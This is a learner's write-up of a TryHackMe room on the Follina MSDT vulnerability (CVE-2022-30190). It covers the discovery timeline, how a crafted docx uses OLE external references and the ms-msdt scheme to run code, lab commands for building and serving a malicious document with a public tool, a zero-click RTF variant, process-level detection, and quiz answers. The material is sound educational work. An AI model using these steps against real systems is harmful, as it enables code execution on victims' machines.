<h1 align="center">Follina MSDT . CVE-2022-30190</h1>
<p align="center">July 22, 2025<br>
<img width="80px" src="https://github.com/user-attachments/assets/c0f58782-fd5e-49ad-9990-d7e2466b1f87"><br>
<em>A walkthrough on the CVE-2022-30190, the MSDT service, exploitation of the service vulnerability,<br>and consequent detection techniques and remediation processes</em>.  Access it <a href="https://tryhackme.com/room/follinamsdt">here</a>.<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
and I’m excited to join you on this adventure, part of my <code>442</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="1200px" src=""></p>

<br>

<h2>Task 1 . Introduction</h2>
<p>Microsoft explains that “a remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights”</p>

<p align="center"><img width="600px" src="https://github.com/user-attachments/assets/a4e09d76-91bc-438e-a142-17ba937e113a"></p>



<h3>Learning Objectives</h3>
<p>In this room, we will explore what the Microsoft Support Diagnostic Tool is and the discovered vulnerability that it has. In the process, we will be able to experience exploiting this vulnerability and consequently learn some techniques to detect and mitigate its exploitation in our own environments.</p>

<h3>Room Prerequisites and Expectation Setting</h3>
<p>There are no hard prerequisites in order to gain value from this room, however it would be very helpful to have a basic understanding of various scripting tools e.g. Windows CLI, Linux Bash Terminal, and PowerShell. Further, this room will touch upon Windows Processes and Data Correlation in lieu of Threat Hunting, albeit nothing too deep nor too complex to be understood.</p>

<h3 align="left"> Answer the question below</h3>

<p>1.1. Hope you enjoy this room<br>
<code>No answer needed</code></p>


<h2>Task 2 . CVE-2022-30190</h2>
<p>The MSDT exploit is not something new - in fact, a bachelor’s thesis has been published August of 2020 regarding techniques on how to use MSDT for code execution. Almost two years after that initial publication, pieces of evidence of MSDT exploitation as well as code execution via Office URIs has triggered several independent researchers to file separate reports to MSRC, the latter of which has been patched (specifically in Microsoft Teams) whereas the former remained vulnerable.<br><br>

It’s not until the discovery of nao_sec, which has been made public in twitter, that attacks using this particular vector is actively being made in the wild. This is consequently picked up by Kevin Beaumont who publicly identified it as a zero day that Microsoft EDR products are failing to detect, and then later classified by Microsoft as a zero day with the vulnerability name CVE-2022-30190</p>

<p>Summarized timeline of its discovery:

- August 1st 2020  — A bachelor thesis is published detailing how to use MSDT to execute code<br>
- March 10th 2021  — researchers report to Microsoft how to use Microsoft Office URIs to execute code using Microsoft Teams as an example. Microsoft fail to issue a CVE or inform customers, but stealth patched it in Microsoft Teams in August 2021. They did not patch MSDT in Windows or the vector in Microsoft Office (Link)<br>
- April 12th 2022  — first report to Microsoft MSRC of exploitation in wild via MSDT, by leader of Shadowchasing1, an APT hunting group. This document is an in the wild, real world exploit targeting Russia, themed as a Russian job interview<br>

<img width="1212" height="562" alt="image" src="https://github.com/user-attachments/assets/e2287b53-32cb-47c9-95b8-26962ea5462a" />

- April 21st 2022  — Microsoft MSRC closed the ticket saying not a security related issue (for the record, msdt executing with macros disabled is an issue)<br>

<img width="1400" height="354" alt="image" src="https://github.com/user-attachments/assets/c93c614a-7c7a-44cc-a796-9447c99fffbb" />

- May 27th 2022  — Security vendor Nao tweet a document uploaded from Belarus, which is also an in the wild attack.<br>
- May 29th 2022  — Kevin Beaumont identified this was a zero day publicly as it still works against Office 365 Semi Annual channel, and ‘on prem’ Office versions and EDR products are failing to detect<br>
- May 31st 2022  — Microsoft classify this a zero day in Microsoft Defender Vulnerability Management<br>

<img width="630" height="573" alt="image" src="https://github.com/user-attachments/assets/37507ad4-4c9e-4c94-9425-d64e22f5e4d3" />

- June 14th 2022  — a fix for this vulnerability, CVE-2022–30190, is available in June 2022’s Patch Tuesday</p>

<p>Further readings::<br>

- Follina — a Microsoft Office code execution vulnerability | by Kevin Beaumont | May, 2022 | DoublePulsar<br>
- Full timeline, early details regarding the vulnerability, and “Follina” namesake courtesy of Kevin Beaumont<br>
- Rapid Response: Microsoft Office RCE - “Follina” MSDT Attack (huntress.com)
</p>

<h3 align="left"> Answer the questions below</h3>

<p>2.1. What year was MSDT first discovered to be vulnerable to code execution?<br>
<code>2020</code></p>

<br>

<p>2.2. Who is the author of the bachelor's thesis which first detailed this vulnerability?<br>
<code>Benjamin Altpeter</code></p>

<br>

<p>2.3.What is the name of the APT hunting group who first reported evidence of exploitation in the wild of MSDT to MSRC? <br>
<code>Shadowchasing1</code></p>


<br>

<h2>Task 3 . The MSDT Service</h2>
<p>Microsoft states that “the Microsoft Support Diagnostic Tool (MSDT) collects information to send to Microsoft Support. They will then analyze this information and use it to determine the resolution to any problems that you may be experiencing on your computer”<br>
<br>

Think of it like this - you’re having car problems and you don’t know about cars at all. You call your trusty car mechanic, but instead of him asking you to check different parts of the car while he tries to deduce what’s wrong with it remotely, he just gives you a passkey, instructs you how to use it and the car will magically produce a report that you can then send to the mechanic. Quick, easy, and efficient.<br>

Further reading: Windows 10 CTP: How To Run Microsoft Support Diagnostic Tool - TechNet Articles - United States (English) - TechNet Wiki</p>

<h3 align="left"> Answer the question below</h3>

<p>3.1. What's one thing you need that the support will provide you when you're using the MSDT legitimately?<br>
<code>passkey</code></p>

<br>

<h2>Task 4 . Exploiting Follina Windows Vulnerability</h2>
<p>Click the Start Machine button on this task before continuing. The machine will be available on your web browser, in split-screen view. 

Before we do any exploitation in the machine, let’s first try and make sense of the baseline processes of the machine. It is in having a sense of normalcy that we’d be able to spot minute changes later on that may consequently reveal malicious activity by a threat actor in our environment.<br>

The process explorer from sysinternals has already been downloaded and pinned in the taskbar for easier access. Proceed to open it and scan through the processes currently running in the machine. Keep it open as we go through the activities later on so you'd be able to immediately see how an exploited follina-msdt vulnerability would look like as compared to the "baseline" - the processes that we're seeing while the machine is immaculate.</p>

<h3>Exploit Expalaination</h3>
<p>Let’s start with a disclaimer: for our purposes, we’ll be loading our payload via a word document, particularly in the .docx format - this is the original exploit that has been discovered in the wild. However, this vulnerability has been proved to work in a number of other office products, and the student is obliged to maximize learning by trying them out separately.<br>

Two important aspects of this vulnerability are: 1) specific docx files contain OLE (originally abbreviates to Object Linking and Embedding) Object references, and sometimes, they take the form of HTML files hosted elsewhere, and 2) MS-MSDT allows for code execution.<br>

Combining the above two aspects together, an MS-MSDT HTML scheme can be used to execute PowerShell code, and that a docx file can be used to load it via word’s external reference capability.<br>

More specifically, drilling into the docx structure, the word/_rels/document.xml.rels file has an XML tag <Relationship> with an attribute Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" that describes an external oleObject reference. In order to exploit this docx feature, we can edit the contents of this tag to point instead to the payload that we're hosting by changing the Target value into http://<external_payload_server.com>/<payload.html> and the TargetMode value into "External".<br>

In the word/document.xml file, there's an XML tag that starts with <o:OLEObject...> wherein we should change the Type value to "Link" and then add the Key-Value pair attribute UpdateMode="OnCall".<br>

The only thing left to do now is to host the payload that the word file will be connecting to, and receiving instructions from upon opening of the file. This is done by creating an html file with a structure similar to this:</p>

<img width="913" height="105" alt="image" src="https://github.com/user-attachments/assets/b06a66c5-51ba-4c61-9789-5f93ae2fdfa9" />

<p>In the above contents of the html file, you'd notice the ms-msdt:/id PCWDiagnostic /skip force /param command, along with the command switches you can use to set the command you want to execute in the target machine. You can then mix and match the payload according to your purposes.<br>

As such, we now have a way to achieve remote code execution without touching any macros, and as we'll see later, without even opening the malicious document.</p>

<h3>Publicly Available Exploit Focus: </h3>

<p>JohnHammond/msdt-follina: JohnHammond/msdt-follina</p>
<p>John Hammond has created a tool to automate the process of creating a malicious document (maldoc) and consequently host the malicious html file that houses the bad command. The tool is documented in the link above, and we will be using a forked version of it to further understand the concept of the exploit touched upon earlier.<br>

To start with our experiment, open a terminal instance in your Attackbox and enter the following command:</p>


<p><em>msdt-follina</em></p>

```bash
root@attackbox:~# cd ~/Rooms/Follina-MSDT
```

<p>We change our working directory to ~/Rooms/Follina-MSDT, where the msdt-follina repository has been cloned for you.</p>

<p><em>Launch the exploit</em></p>

```bash
root@attackbox:~/Rooms/Follina-MSDT# python3.9 follina.py -i ens5
[+] copied staging doc /tmp/[random string]
[+] created maldoc ./follina.doc
[+] serving html payload on :8000
```

<p>Upon firing up the exploit, you should be hosting the file already, so it’s ready to be “delivered” to the victim machine. Effective delivery mechanisms of malicious payloads are outside the scope of this room, so we’ll just settle for a simpler way of transferring files from linux to windows:<br>

 

While keeping the original terminal open, open another terminal in your Attackbox and enter the following command:</p>

<p><em>Simple HTTP Server</em></p>

```bash
root@attackbox:~# cd ~/Rooms/Follina-MSDT 

root@attackbox:~/Rooms/Follina-MSDT# python3 -m http.server 3456
Serving HTTP on 0.0.0.0 port 3456 (http://0.0.0.0:3456/) ...
```

<p>Start the Windows machine and wait for it to initialize. When everything's settled, proceed to open a command prompt and enter the following command:</p>

<p><em>Maldoc Download</em></p>

```bash
Microsoft Windows [Version]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator> cd Desktop
C:\Users\Administrator\Desktop> curl http://[attackbox IP]:3456/follina.doc -o follina.docx
```

<p>This downloads the maldoc in our machine and as such, shortly after, you should be able to see the word file named follina.docx appear in the Desktop, ready to be run. When you're ready, open the file and watch what happens.<br>

 

For now, let's allow the maldoc and all of the stuff that it spawned, to remain running, while we examine the contents of the process explorer.</p>

<h3>Process Explorer</h3>
<p>Looking at the process explorer may be daunting as there are a ton of processes always running within the machine. In our case, we haven't done a lot of stuff with it and yet the number of running processes already covers the entire screen. This is where the importance of "making sense of the baseline", discussed in the first part of this task, is emphasized.<br>

If you don't have any established baseline, it's easy to get paranoid and everything will suddenly seem to be suspicious. This is where you start wasting your time checking each and every process there is - mainly because you're unfamiliar with each and every one of them.<br>

Scrolling through the processes, you'll be able to spot WINWORD.EXE immediately, followed by an msdt.exe child process. Somewhere in the list of processes you'll be able to see a process for the calculator as well which is the win32calc.exe. It might look something like this, although it's completely normal if the WINDWORD.EXE and the win32calc.exe are far away from each other.</p>

<img width="683" height="53" alt="image" src="https://github.com/user-attachments/assets/49dea496-e3d0-48b3-8c6e-81b463ae50c8" />

<p>Now, finding these artifacts are easy because we already know what to look for, but how do we tackle the ones that we don't know about, the so called unknown unknowns? Well, we can refer to the baseline that we have, we compare, and then we validate.</p>

<h3>"Zero Click" Implementation</h3>
<p>In order to replicate the “zero click” implementation of this vulnerability, we simply head to the malicious word file, add a cute message (completely optional),  save it in the Rich Text Format (RTF), and we’re good to go. This implementation assumes that the victim machine is in the preview pane view, else it will revert to the original functionality which will still run upon opening of the file.<br>

Open the file explorer and navigate to the Desktop folder. There you will see the seemingly honest file that we made that needs clicking, proceed to click it once careful not to actually open it and see what will happen.<br>

Despite not actually opening the file, the exploit ran in the same manner that it did earlier in this exercise. This happened because of two key features: 1) the feature of the File Explorer to preview files before opening them, and 2) the RTF which allows the feature of document files being able to be previewed in the File Explorer before being opened (among other purposes).<br>

Combining the two and then abusing them will result in an attack vector that we’ve just witnessed now.</p>

<h3 align="left"> Answer the questions below</h3>

<p>4.1. What application got executed upon opening of the maldoc that signified compromise? Answer format is "<app>.exe"<br>
<code>win32calc.exe</code></p>

<img width="683" height="53" alt="image" src="https://github.com/user-attachments/assets/49dea496-e3d0-48b3-8c6e-81b463ae50c8" />

<br>

<p>4.2. What is the filename of the .docx file that has been discovered in the wild? Write it exactly as you see it.

Fun fact: The last part of the filename is actually the area code of Follina, Italy which is where this vulnerability got it's name from. <em> Hint : External Research Required<br>
<code>05-2022-0438.doc</code></p>


